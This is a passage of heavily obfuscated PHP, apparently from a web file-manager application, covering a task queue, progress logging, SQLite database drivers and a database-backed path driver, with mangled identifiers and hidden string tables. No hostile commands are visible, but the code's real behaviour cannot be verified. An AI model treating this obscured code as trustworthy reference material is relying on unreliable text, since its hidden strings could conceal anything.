$´³ë²î², 0, $ÛÁßî”Ó ? $ÛÁßî”Ó : $‚‰¿âì[0]); foreach ($‚‰¿âì as $¾Š­ª—) { $İ®ö«Ô¸->addPath($¾Š­ª—); } break; case $ôÇõŸ’Ş[1210]: if (!$¥¾ƒÊÜ­) { return echoLog($´³ë²î² . $ôÇõŸ’Ş[1749]); } $İ®ö«Ô¸ = new TaskUnZip($§›¢©×, $´³ë²î², 0, $ÛÁßî”Ó ? $ÛÁßî”Ó : $¥¾ƒÊÜ­); if ($¥¾ƒÊÜ­) { $İ®ö«Ô¸->addFile($¥¾ƒÊÜ­); } break; case $ôÇõŸ’Ş[148]: $İ®ö«Ô¸ = new TaskHttp($§›¢©×, $´³ë²î²); break; default: return; break; } $this->task = $İ®ö«Ô¸; $this->taskID = $§›¢©×; Hook::bind($ôÇõŸ’Ş[1684], array($this, $ôÇõŸ’Ş[1750])); Hook::bind($ôÇõŸ’Ş[1686], array($this, $ôÇõŸ’Ş[1751])); Hook::bind($ôÇõŸ’Ş[1680], array($this, $ôÇõŸ’Ş[1752])); echoLog($ôÇõŸ’Ş[1753] . $İ®ö«Ô¸->task[$ôÇõŸ’Ş[1561]]); } public function __destruct() { $this->end(); } public function end($œØğÚÖ = '') { $¾Æ¦Ùß‰ =& $_SERVER[­á Ş³Ö]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($œØğÚÖ); $this->task = !1; $this->taskID = !1; Hook::unbind($¾Æ¦Ùß‰[1684], array($this, $¾Æ¦Ùß‰[1750])); Hook::unbind($¾Æ¦Ùß‰[1686], array($this, $¾Æ¦Ùß‰[1751])); Hook::unbind($¾Æ¦Ùß‰[1680], array($this, $¾Æ¦Ùß‰[1752])); } public function taskUpdate($Á¼¸âÏ) { $„öåÄ»Š =& $_SERVER[­á Ş³Ö]; if (!$Á¼¸âÏ || $this->taskID != $Á¼¸âÏ[$„öåÄ»Š[399]]) { return; } $†µ¶Ğ­£ = 20; $úÚêÃÑ§ = intval($Á¼¸âÏ[$„öåÄ»Š[1665]] * $†µ¶Ğ­£); $ç§÷ğÚ = $„öåÄ»Š[162] . str_repeat($„öåÄ»Š[880], $úÚêÃÑ§) . $„öåÄ»Š[1010] . str_repeat($„öåÄ»Š[53], $†µ¶Ğ­£ - $úÚêÃÑ§) . $„öåÄ»Š[164]; $éË¸–Ù— = $ç§÷ğÚ . sprintf($„öåÄ»Š[1754], $Á¼¸âÏ[$„öåÄ»Š[1665]] * 100) . $„öåÄ»Š[1755]; $´âåì¤¯ = $éË¸–Ù— . $Á¼¸âÏ[$„öåÄ»Š[1664]] . $„öåÄ»Š[8] . $Á¼¸âÏ[$„öåÄ»Š[783]] . LNG($„öåÄ»Š[1756]); $º¶ä® † = $„öåÄ»Š[12]; if ($Á¼¸âÏ[$„öåÄ»Š[1740]]) { $´âåì¤¯ = $éË¸–Ù— . size_format($Á¼¸âÏ[$„öåÄ»Š[1664]]) . $„öåÄ»Š[8] . size_format($Á¼¸âÏ[$„öåÄ»Š[783]]); $º¶ä® † = size_format($Á¼¸âÏ[$„öåÄ»Š[1666]]) . $„öåÄ»Š[1757]; } if ($Á¼¸âÏ[$„öåÄ»Š[1060]]) { $Á¼¸âÏ[$„öåÄ»Š[1714]] = $Á¼¸âÏ[$„öåÄ»Š[1060]] . $„öåÄ»Š[53] . $Á¼¸âÏ[$„öåÄ»Š[1714]]; } if ($Á¼¸âÏ[$„öåÄ»Š[1714]]) { $‘„¯öÁ¾ = $„öåÄ»Š[12]; if ($Á¼¸âÏ[$„öåÄ»Š[1716]]) { $‘„¯öÁ¾ = $„öåÄ»Š[50] . size_format($Á¼¸âÏ[$„öåÄ»Š[1717]]) . $„öåÄ»Š[8] . size_format($Á¼¸âÏ[$„öåÄ»Š[1716]]); } $º¶ä® † .= $Á¼¸âÏ[$„öåÄ»Š[1714]] . $‘„¯öÁ¾; } if ($Á¼¸âÏ[$„öåÄ»Š[760]] && !$Á¼¸âÏ[$„öåÄ»Š[1716]]) { $º¶ä® † .= $„öåÄ»Š[53] . size_format($Á¼¸âÏ[$„öåÄ»Š[1721]]) . $„öåÄ»Š[8] . size_format($Á¼¸âÏ[$„öåÄ»Š[760]]); } echoLog($´âåì¤¯ . $„öåÄ»Š[53] . $º¶ä® †, !0); } public function taskEnd($£ùğÎ´—) { $´‚¬·’Û =& $_SERVER[­á Ş³Ö]; if (!$£ùğÎ´— || $this->taskID != $£ùğÎ´—[$´‚¬·’Û[399]]) { return; } $Ø±‹á÷ª = $£ùğÎ´— ? $£ùğÎ´—[$´‚¬·’Û[1664]] . $´‚¬·’Û[8] . $£ùğÎ´—[$´‚¬·’Û[783]] . LNG($´‚¬·’Û[1756]) . $´‚¬·’Û[71] : $´‚¬·’Û[12]; echoLog($´‚¬·’Û[1758] . $£ùğÎ´—[$´‚¬·’Û[1561]] . ($£ùğÎ´—[$´‚¬·’Û[453]] ? $´‚¬·’Û[71] . $£ùğÎ´—[$´‚¬·’Û[453]] : $´‚¬·’Û[12]) . $´‚¬·’Û[71] . $Ø±‹á÷ª . $´‚¬·’Û[1759] . sprintf($´‚¬·’Û[847], timeFloat() - $£ùğÎ´—[$´‚¬·’Û[1667]]) . $´‚¬·’Û[1679]); $this->end(); } public function taskKill($ì´Ì“„û) { $Œô¦²û¯ =& $_SERVER[­á Ş³Ö]; if (!$ì´Ì“„û || $this->taskID != $ì´Ì“„û[$Œô¦²û¯[399]]) { return; } echoLog($Œô¦²û¯[1760] . $ì´Ì“„û[$Œô¦²û¯[1561]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\165\145\x75\x65\x4c\x65\156\x67\164\x68"; const QUEUE_DATA = "\x74\x61\x73\153\x51\x75\145\x75\145\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($¨ÅÖ‡çƒ, $‘Ç˜š¶ó = array(), $ßª°«ã = '', $Üæ–ø¹‘ = '') { $ŠÏËâáÀ =& $_SERVER[­á Ş³Ö]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Üæ–ø¹‘ && array_find_by_field(self::$listData, $ŠÏËâáÀ[94], $Üæ–ø¹‘)) { return !0; } self::$listData[] = array($ŠÏËâáÀ[264] => $¨ÅÖ‡çƒ, $ŠÏËâáÀ[1761] => $‘Ç˜š¶ó, $ŠÏËâáÀ[453] => $ßª°«ã, $ŠÏËâáÀ[94] => $Üæ–ø¹‘); return !0; } public static function addSubmit() { $€½æŞ¼’ =& $_SERVER[­á Ş³Ö]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($€½æŞ¼’[1762] . json_encode_force(array_to_keyvalue(self::$listData, $€½æŞ¼’[12], $€½æŞ¼’[453])), $€½æŞ¼’[1763]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Š÷Øú¥ß, $ŠÍôÍó = array(), $ÀÔéİ = '', $ ÷÷š´ã = '') { $à›Ó§È =& $_SERVER[­á Ş³Ö]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ò—¥™Øò = self::getAll(); if ($ ÷÷š´ã && array_find_by_field($ò—¥™Øò, $à›Ó§È[94], $ ÷÷š´ã)) { return !0; } $ò—¥™Øò[] = array($à›Ó§È[264] => $Š÷Øú¥ß, $à›Ó§È[1761] => $ŠÍôÍó, $à›Ó§È[453] => $ÀÔéİ, $à›Ó§È[94] => $ ÷÷š´ã); write_log($à›Ó§È[1762] . $ÀÔéİ, $à›Ó§È[1763]); self::setAll($ò—¥™Øò); return !0; } public static function run() { $°ËÑå =& $_SERVER[­á Ş³Ö]; $·È’åÙ = self::getAll(); $ØäÕèõè = array_shift($·È’åÙ); if (!$ØäÕèõè) { return !1; } self::setAll($·È’åÙ); $¬°Ã’µ = timeFloat(); try { Hook::apply($ØäÕèõè[$°ËÑå[264]], $ØäÕèõè[$°ËÑå[1761]]); } catch (Exception $™Ç¨‡¬Í) { } $ÉÅæÍ²Ò = number_format(timeFloat() - $¬°Ã’µ, 3) . $°ËÑå[1679]; write_log($°ËÑå[1764] . $ØäÕèõè[$°ËÑå[453]] . $°ËÑå[1765] . $ÉÅæÍ²Ò, $°ËÑå[1763]); return !0; } public static function count() { $«õ»îœÌ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$«õ»îœÌ) { return 0; } return intval($«õ»îœÌ); } public static function getAll() { $¢¦òãŠ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$¢¦òãŠ) { return array(); } return $¢¦òãŠ; } public static function setAll($†ıÛÇ¸©) { $§¥ÖÖ—É = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($†ıÛÇ¸©), $§¥ÖÖ—É); Cache::set(self::QUEUE_DATA, $†ıÛÇ¸©, $§¥ÖÖ—É); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto FŸ …¬•Ì‘; Dº¥‘Í”ÀÈ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¸ÁÒ”Š =& $_SERVER[­á Ş³Ö]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¸ÁÒ”Š[6]] =& $config; $this->values[$¸ÁÒ”Š[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¸ÁÒ”Š[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ª¥–»•Õ) { if (1 === func_num_args()) { $this->{$ª¥–»•Õ} = new $ª¥–»•Õ(); } else { $…É“ûï = new ReflectionClass($ª¥–»•Õ); $Êº¥Ú…Ÿ = func_get_args(); array_shift($Êº¥Ú…Ÿ); $this->{$ª¥–»•Õ} = $…É“ûï->newInstanceArgs($Êº¥Ú…Ÿ); } return $this->{$ª¥–»•Õ}; } public function routeBind($Ÿè”ë¼ì, $¿–ĞşƒÛ, $‡îÜò÷‚ = 3) { $Ë‰¼Ì¼ =& $_SERVER[­á Ş³Ö]; $ãÅ®‰Ú± = $this->in[$Ë‰¼Ì¼[9]]; $Ÿè”ë¼ì = str_replace($Ë‰¼Ì¼[10], $Ë‰¼Ì¼[11], trim(trim($Ÿè”ë¼ì, $Ë‰¼Ì¼[8]), $Ë‰¼Ì¼[12])); if (!$Ÿè”ë¼ì || count($ãÅ®‰Ú±) <= $‡îÜò÷‚) { return !1; } $ë¯œîÌ” = !0; $—¬·Ş“ = explode($Ë‰¼Ì¼[8], $Ÿè”ë¼ì); for ($Á³Ù·ëá = 0; $Á³Ù·ëá < count($—¬·Ş“); $Á³Ù·ëá++) { if ($—¬·Ş“[$Á³Ù·ëá] != $ãÅ®‰Ú±[$‡îÜò÷‚ + $Á³Ù·ëá]) { $ë¯œîÌ” = !1; break; } } if (!$ë¯œîÌ”) { return; } call_user_func_array(array($this, $¿–ĞşƒÛ), array()); } public function routeArgs($û”êš©Ñ = 3) { $’‹Îø‰ = $this->in[$_SERVER[­á Ş³Ö][9]]; if (count($’‹Îø‰) <= $û”êš©Ñ) { return array(); } $‘ƒ¢…âŒ = array(); for ($ßï—†ï = $û”êš©Ñ; $ßï—†ï < count($’‹Îø‰); $ßï—†ï += 2) { $‘ƒ¢…âŒ[$’‹Îø‰[$ßï—†ï]] = $’‹Îø‰[$ßï—†ï + 1]; $this->in[$’‹Îø‰[$ßï—†ï]] = $’‹Îø‰[$ßï—†ï + 1]; } return $‘ƒ¢…âŒ; } protected function assign($ˆËÙœ¥º, $ä€¬Š“§) { $this->values[$ˆËÙœ¥º] = $ä€¬Š“§; } protected function display($ÌÙŠò–ù) { ob_end_clean(); extract($this->values); require $this->tpl . $ÌÙŠò–ù; } } class DbSqliteBase extends Db { public function __construct($Çä´Ğ–º = '') { $­Î©ÍÖÙ =& $_SERVER[­á Ş³Ö]; if (!extension_loaded($­Î©ÍÖÙ[13])) { think_exception(think_lang($­Î©ÍÖÙ[14]) . $­Î©ÍÖÙ[15]); } if (!empty($Çä´Ğ–º)) { if (!isset($Çä´Ğ–º[$­Î©ÍÖÙ[16]])) { $Çä´Ğ–º[$­Î©ÍÖÙ[16]] = 438; } $this->config = $Çä´Ğ–º; if (empty($this->config[$­Î©ÍÖÙ[17]])) { $this->config[$­Î©ÍÖÙ[17]] = array(); } } } public function connect($õŞÍªì = '', $Â÷˜Ğş½ = 0) { $†È·ğ›ª =& $_SERVER[­á Ş³Ö]; if (!isset($this->linkID[$Â÷˜Ğş½])) { if (empty($õŞÍªì)) { $õŞÍªì = $this->config; } $ˆ“‘Ææ÷ = !empty($õŞÍªì[$†È·ğ›ª[17]][$†È·ğ›ª[18]]) ? $õŞÍªì[$†È·ğ›ª[17]][$†È·ğ›ª[18]] : $this->pconnect; $àìöë£ß = $ˆ“‘Ææ÷ ? $†È·ğ›ª[19] : $†È·ğ›ª[20]; $this->linkID[$Â÷˜Ğş½] = $àìöë£ß($õŞÍªì[$†È·ğ›ª[21]], $õŞÍªì[$†È·ğ›ª[16]]); if (!$this->linkID[$Â÷˜Ğş½]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Â÷˜Ğş½], 30000); if (1 != think_config($†È·ğ›ª[22])) { unset($this->config); } } return $this->linkID[$Â÷˜Ğş½]; } public function free() { $this->queryID = null; } public function query($Şïô”ïå) { $ŸÎ¦À‚ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Şïô”ïå; if ($this->queryID) { $this->free(); } think_action_status($ŸÎ¦À‚[23], 1); think_status($ŸÎ¦À‚[24]); $this->queryID = sqlite_query($this->_linkID, $Şïô”ïå); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $üœªå† = $this->getAll(); return $üœªå†; } } public function execute($›Ş´¡ù) { $æÈŸÌıÖ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›Ş´¡ù; if ($this->queryID) { $this->free(); } think_action_status($æÈŸÌıÖ[25], 1); think_status($æÈŸÌıÖ[24]); $‚¨ù²Èƒ = sqlite_exec($this->_linkID, $›Ş´¡ù); $this->debug(); if (!1 === $‚¨ù²Èƒ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[­á Ş³Ö][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $á»à†’ = sqlite_query($this->_linkID, $_SERVER[­á Ş³Ö][27]); if (!$á»à†’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $İ‹Ñöïê = sqlite_query($this->_linkID, $_SERVER[­á Ş³Ö][28]); if (!$İ‹Ñöïê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $êÍ³Îâ› = array(); if ($this->numRows > 0) { for ($Ô±µ¡­ = 0; $Ô±µ¡­ < $this->numRows; $Ô±µ¡­++) { $êÍ³Îâ›[$Ô±µ¡­] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $êÍ³Îâ›; } public function getFields($¶ùãĞ›„) { $ïÍ¨œĞƒ =& $_SERVER[­á Ş³Ö]; $„™û˜à¼ = $this->query($ïÍ¨œĞƒ[29] . $¶ùãĞ›„ . $ïÍ¨œĞƒ[30]); $Ø ÎŒ¶Ñ = array(); if ($„™û˜à¼) { foreach ($„™û˜à¼ as $¥ôÖ¹ö™ => $œÀ‘¼œô) { $Ø ÎŒ¶Ñ[$œÀ‘¼œô[$ïÍ¨œĞƒ[31]]] = array($ïÍ¨œĞƒ[32] => $œÀ‘¼œô[$ïÍ¨œĞƒ[31]], $ïÍ¨œĞƒ[33] => $œÀ‘¼œô[$ïÍ¨œĞƒ[34]], $ïÍ¨œĞƒ[35] => (bool) ($œÀ‘¼œô[$ïÍ¨œĞƒ[36]] === $ïÍ¨œĞƒ[12]), $ïÍ¨œĞƒ[37] => $œÀ‘¼œô[$ïÍ¨œĞƒ[38]], $ïÍ¨œĞƒ[39] => strtolower($œÀ‘¼œô[$ïÍ¨œĞƒ[40]]) == $ïÍ¨œĞƒ[41], $ïÍ¨œĞƒ[42] => strtolower($œÀ‘¼œô[$ïÍ¨œĞƒ[43]]) == $ïÍ¨œĞƒ[44]); } } return $Ø ÎŒ¶Ñ; } public function getTables($î£©Ôó = '') { $¨Ê°Ë¤˜ =& $_SERVER[­á Ş³Ö]; $›Ôéêâ÷ = $this->query($¨Ê°Ë¤˜[45] . $¨Ê°Ë¤˜[46] . $¨Ê°Ë¤˜[47]); $üÉ¡Ü = array(); foreach ($›Ôéêâ÷ as $ûø•£ğ÷ => $˜•ì›îÓ) { $üÉ¡Ü[$ûø•£ğ÷] = current($˜•ì›îÓ); } return $üÉ¡Ü; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‚§Ë‘ïŸ =& $_SERVER[­á Ş³Ö]; $Ö×ùóè = sqlite_last_error($this->_linkID); $this->error = $Ö×ùóè . $‚§Ë‘ïŸ[4] . sqlite_error_string($Ö×ùóè); if ($‚§Ë‘ïŸ[12] != $this->queryStr) { $this->error .= LNG($‚§Ë‘ïŸ[48]) . $this->queryStr; } think_trace($this->error, $‚§Ë‘ïŸ[12], $‚§Ë‘ïŸ[49]); return $this->error; } public function escapeString($İçËÇï) { return sqlite_escape_string($İçËÇï); } public function parseLimit($ÒÃòúÜä) { $¸“Ú¹Öæ =& $_SERVER[­á Ş³Ö]; $Ïê˜´Ñ = $¸“Ú¹Öæ[12]; if (!empty($ÒÃòúÜä)) { $ÒÃòúÜä = explode($¸“Ú¹Öæ[50], $ÒÃòúÜä); if (count($ÒÃòúÜä) > 1) { $Ïê˜´Ñ .= $¸“Ú¹Öæ[51] . $ÒÃòúÜä[1] . $¸“Ú¹Öæ[52] . $ÒÃòúÜä[0] . $¸“Ú¹Öæ[53]; } else { $Ïê˜´Ñ .= $¸“Ú¹Öæ[51] . $ÒÃòúÜä[0] . $¸“Ú¹Öæ[53]; } } return $Ïê˜´Ñ; } } class DbSqlite3Base extends Db { public function __construct($ı¶®ˆÆ = '') { $œúİÛ›Ï =& $_SERVER[­á Ş³Ö]; if (!class_exists($œúİÛ›Ï[54])) { think_exception(think_lang($œúİÛ›Ï[14]) . $œúİÛ›Ï[55]); } if (!empty($ı¶®ˆÆ)) { if (!isset($ı¶®ˆÆ[$œúİÛ›Ï[16]])) { $ı¶®ˆÆ[$œúİÛ›Ï[16]] = 438; } $this->config = $ı¶®ˆÆ; if (empty($this->config[$œúİÛ›Ï[17]])) { $this->config[$œúİÛ›Ï[17]] = array(); } } } public function connect($ÄÜÈ¨šÜ = '', $¿Í«¥ç´ = 0) { $Èß¦œ›Ë =& $_SERVER[­á Ş³Ö]; if (!isset($this->linkID[$¿Í«¥ç´])) { if (empty($ÄÜÈ¨šÜ)) { $ÄÜÈ¨šÜ = $this->config; } $this->linkID[$¿Í«¥ç´] = new SQLite3($ÄÜÈ¨šÜ[$Èß¦œ›Ë[21]]); if (!$this->linkID[$¿Í«¥ç´]) { think_exception($this->linkID[$¿Í«¥ç´]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¿Í«¥ç´]->busyTimeout(30000); if (1 != think_config($Èß¦œ›Ë[22])) { unset($this->config); } } return $this->linkID[$¿Í«¥ç´]; } public function free() { $this->queryID = null; } public function query($ıÏÑãêá) { $©Ô©¶¿× =& $_SERVER[­á Ş³Ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ıÏÑãêá; if ($this->queryID) { $this->free(); } think_action_status($©Ô©¶¿×[23], 1); think_status($©Ô©¶¿×[24]); $this->queryID = $this->_linkID->query($ıÏÑãêá); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ú»Êûêé = $this->getAll(); $this->numRows = count($Ú»Êûêé); return $Ú»Êûêé; } } public function execute($ÉÕÈÕî©) { $¦œ°»’ =& $_SERVER[­á Ş³Ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÉÕÈÕî©; if ($this->queryID) { $this->free(); } think_action_status($¦œ°»’[25], 1); think_status($¦œ°»’[24]); $ ²¿ÇõÒ = $this->_linkID->exec($ÉÕÈÕî©); $this->debug(); if (!1 === $ ²¿ÇõÒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[­á Ş³Ö][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ê†Óá·é = $this->_linkID->query($_SERVER[­á Ş³Ö][27]); if (!$Ê†Óá·é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $„Ÿ·ìµö = $this->_linkID->query($_SERVER[­á Ş³Ö][28]); if (!$„Ÿ·ìµö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ú¹è¼·¿ = array(); while ($‹’×ï©™ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ú¹è¼·¿[] = $‹’×ï©™; } $this->queryID->reset(); return $Ú¹è¼·¿; } public function getFields($ñÄœöøÉ) { $ìîÑÊ˜ =& $_SERVER[­á Ş³Ö]; $Œ”Çì· = $this->query($ìîÑÊ˜[29] . $ñÄœöøÉ . $ìîÑÊ˜[30]); $ûêÔ¬Ú– = array(); if ($Œ”Çì·) { foreach ($Œ”Çì· as $Ùµ³İ¥û => $¯‚ÊäîÖ) { $ûêÔ¬Ú–[$¯‚ÊäîÖ[$ìîÑÊ˜[32]]] = array($ìîÑÊ˜[32] => $¯‚ÊäîÖ[$ìîÑÊ˜[32]], $ìîÑÊ˜[33] => $¯‚ÊäîÖ[$ìîÑÊ˜[33]], $ìîÑÊ˜[35] => (bool) ($¯‚ÊäîÖ[$ìîÑÊ˜[35]] === $ìîÑÊ˜[12]), $ìîÑÊ˜[37] => $¯‚ÊäîÖ[$ìîÑÊ˜[56]], $ìîÑÊ˜[39] => (bool) $¯‚ÊäîÖ[$ìîÑÊ˜[57]], $ìîÑÊ˜[42] => (bool) $¯‚ÊäîÖ[$ìîÑÊ˜[57]]); } } return $ûêÔ¬Ú–; } public function getTables($µ©ÓÃî´ = '') { $â˜»ÆŞğ =& $_SERVER[­á Ş³Ö]; $°ƒªÌ° = $this->query($â˜»ÆŞğ[45] . $â˜»ÆŞğ[46] . $â˜»ÆŞğ[47]); $Œ­¥Ò¶Ô = array(); foreach ($°ƒªÌ° as $¤‰‡Ôµî => $Œè·¶Üà) { $Œ­¥Ò¶Ô[$¤‰‡Ôµî] = current($Œè·¶Üà); } return $Œ­¥Ò¶Ô; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $»¥±øİÊ =& $_SERVER[­á Ş³Ö]; $this->error = $this->_linkID->lastErrorMsg(); if ($»¥±øİÊ[12] != $this->queryStr) { $this->error .= LNG($»¥±øİÊ[48]) . $this->queryStr; } think_trace($this->error, $»¥±øİÊ[12], $»¥±øİÊ[49]); return $this->error; } public function escapeString($¢³§¨éÎ) { $¦Ö‚Õ‚ =& $_SERVER[­á Ş³Ö]; if ($this->_linkID) { return $this->_linkID->escapeString($¢³§¨éÎ); } return str_ireplace($¦Ö‚Õ‚[58], $¦Ö‚Õ‚[59], $¢³§¨éÎ); } public function parseLimit($†Üéğı½) { $Ñ¯õá‚— =& $_SERVER[­á Ş³Ö]; $¬ş¾¢Š€ = $Ñ¯õá‚—[12]; if (!empty($†Üéğı½)) { $†Üéğı½ = explode($Ñ¯õá‚—[50], $†Üéğı½); if (count($†Üéğı½) > 1) { $¬ş¾¢Š€ .= $Ñ¯õá‚—[51] . $†Üéğı½[1] . $Ñ¯õá‚—[52] . $†Üéğı½[0] . $Ñ¯õá‚—[53]; } else { $¬ş¾¢Š€ .= $Ñ¯õá‚—[51] . $†Üéğı½[0] . $Ñ¯õá‚—[53]; } } return $¬ş¾¢Š€; } } goto DÄ­¬´æ; CœöùÂë: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($À‚ıÌ) { $this->pathParse = $À‚ıÌ; $this->model = Model($_SERVER[­á Ş³Ö][1335]); } public function getPath($²àÂ®ÓÂ) { return trim($²àÂ®ÓÂ, $_SERVER[­á Ş³Ö][8]); } public function pathFather($¤¤Ñï¦ò) { $øßù”™ = $this->parse($¤¤Ñï¦ò); $øßù”™ = $this->infoSimple($¤¤Ñï¦ò); return $øßù”™ ? $øßù”™[$_SERVER[­á Ş³Ö][432]] : !1; } public function pathThis($÷¤®Àìç) { $›µÁ¯¡¤ = $this->infoSimple($÷¤®Àìç); return $›µÁ¯¡¤ ? $›µÁ¯¡¤[$_SERVER[­á Ş³Ö][32]] : !1; } public function getPathOuter($ü®À¬´) { if (!$ü®À¬´) { return $ü®À¬´; } $¨¯òû¼ş = $this->parse($ü®À¬´); return KodIO::make($¨¯òû¼ş[$_SERVER[­á Ş³Ö][399]]); } public function copyFolderFromIO($–ÂıîÁ‘, $•ãè‘çØ, $˜©ğšû÷, $´áÁüáò, $õû˜™Ëî) { $òÓìä‚ = $this->model->copyFolderFromIO($–ÂıîÁ‘, $•ãè‘çØ, $˜©ğšû÷, $´áÁüáò, $õû˜™Ëî); return KodIO::make($òÓìä‚); } public function isParentOf($¸œ£ª¥¯, $Áºòöï) { return $this->model->isParentOf($¸œ£ª¥¯, $Áºòöï); } public function mkfile($ÌŞ­À±Ñ, $·Ğ¯¾¨ = '', $Ğ¬¸éÏ´ = REPEAT_RENAME) { $ñåÔİçÄ =& $_SERVER[­á Ş³Ö]; $É«Äí¥ = $this->parse($ÌŞ­À±Ñ); $ÌŞ­À±Ñ = $É«Äí¥[$ñåÔİçÄ[399]]; for ($¬Äç™¸¼ = 0; $¬Äç™¸¼ < count($É«Äí¥[$ñåÔİçÄ[1336]]); $¬Äç™¸¼++) { $ş‘ıä× = $É«Äí¥[$ñåÔİçÄ[1336]][$¬Äç™¸¼]; if ($¬Äç™¸¼ == count($É«Äí¥[$ñåÔİçÄ[1336]]) - 1) { $ÌŞ­À±Ñ = $this->model->mkfile($ÌŞ­À±Ñ, $ş‘ıä×, $·Ğ¯¾¨, $Ğ¬¸éÏ´); break; } $ÌŞ­À±Ñ = $this->model->mkdir($ÌŞ­À±Ñ, $ş‘ıä×, REPEAT_SKIP); } return $this->getPathOuter($ÌŞ­À±Ñ); } public function mkdir($ö…ùÀ¯ğ, $©ù€‹¾ = REPEAT_SKIP) { $¾ò–ö‚ä =& $_SERVER[­á Ş³Ö]; $²±Ëñğ£ = $this->parse($ö…ùÀ¯ğ); $ö…ùÀ¯ğ = $²±Ëñğ£[$¾ò–ö‚ä[399]]; for ($ÑÎû×Ø = 0; $ÑÎû×Ø < count($²±Ëñğ£[$¾ò–ö‚ä[1336]]); $ÑÎû×Ø++) { $§”¶Üá­ = $²±Ëñğ£[$¾ò–ö‚ä[1336]][$ÑÎû×Ø]; $ö…ùÀ¯ğ = $this->model->mkdir($ö…ùÀ¯ğ, $§”¶Üá­, $©ù€‹¾); } return $this->getPathOuter($ö…ùÀ¯ğ); } public function copyFile($ıé¥µ¸¦, $¾İóò, $¬¾‘ğŒ = REPEAT_REPLACE) { $÷»ï¢È¶ =& $_SERVER[­á Ş³Ö]; $¬¬’Íƒ¢ = $this->parse($¾İóò); $ª‹¬éÃ = $this->model->copy($ıé¥µ¸¦, $¬¬’Íƒ¢[$÷»ï¢È¶[399]], $¬¾‘ğŒ, $¬¬’Íƒ¢[$÷»ï¢È¶[84]]); return $ª‹¬éÃ ? $this->getPathOuter($ª‹¬éÃ) : !1; } public function moveFile($Ÿ¥¥»¥°, $«ú×¢ñ, $²üæÌã’ = REPEAT_REPLACE) { $±Şïó½é =& $_SERVER[­á Ş³Ö]; $ÁÅ¥¡€ = $this->parse($«ú×¢ñ); $’Õûâë² = $this->model->move($Ÿ¥¥»¥°, $ÁÅ¥¡€[$±Şïó½é[399]], $²üæÌã’, $ÁÅ¥¡€[$±Şïó½é[84]]); return $’Õûâë² ? $this->getPathOuter($’Õûâë²) : !1; } public function copy($õì¯², $»Ÿà®Ö, $ˆœ¶˜Á = REPEAT_REPLACE, $õ‚Éïûú = false) { $ß¥¨Ü‚É = $this->parse($»Ÿà®Ö); $ÑÊ›Õ’å = $this->model->copy($õì¯², $ß¥¨Ü‚É[$_SERVER[­á Ş³Ö][399]], $ˆœ¶˜Á, $õ‚Éïûú); return $ÑÊ›Õ’å ? $this->getPathOuter($ÑÊ›Õ’å) : !1; } public function moveSameAllow() { } public function move($“ªè»Ö, $ÕÛÖ–•Î, $Í¹öƒ™– = REPEAT_REPLACE, $š•¤Öñğ = false) { $û×Ÿ¤Í = $this->parse($ÕÛÖ–•Î); $ëã¨Èëê = $this->model->move($“ªè»Ö, $û×Ÿ¤Í[$_SERVER[­á Ş³Ö][399]], $Í¹öƒ™–, $š•¤Öñğ); return $ëã¨Èëê ? $this->getPathOuter($ëã¨Èëê) : !1; } public function remove($•¸êÙ°¿, $Üç‚¼Ã = true) { return $this->model->remove($•¸êÙ°¿, $Üç‚¼Ã); } public function rename($ºüéê˜¶, $ŸæÖ ) { $Šû¬Ó•ê = 